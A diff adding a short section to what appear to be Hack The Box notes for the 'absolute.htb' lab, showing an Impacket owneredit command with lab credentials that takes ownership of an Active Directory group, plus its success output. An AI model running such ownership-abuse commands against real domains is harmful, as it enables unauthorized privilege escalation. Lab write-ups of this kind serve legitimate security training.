@@ -502,6 +502,20 @@ I have WriteOwner over a group
 # Abusing `WriteOwner`
 
 ```python
+faketime -f +7h owneredit.py -action write -new-owner 'm.lovegod' -target-dn 'CN=NETWORK AUDIT,CN=USERS,DC=ABSOLUTE,DC=HTB' 'absolute.htb'/m.lovegod:'AbsoluteLDAP2022!' -k -dc-ip 10.129.232.60
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Current owner information below
+[*] - SID: S-1-5-21-4078382237-1492182817-2568127209-1109
+[*] - sAMAccountName: m.lovegod
+[*] - distinguishedName: CN=m.lovegod,CN=Users,DC=absolute,DC=htb
+[*] OwnerSid modified successfully!
+```
+
+First ill grant ownership over the object
+
+```python
 
 ```
 
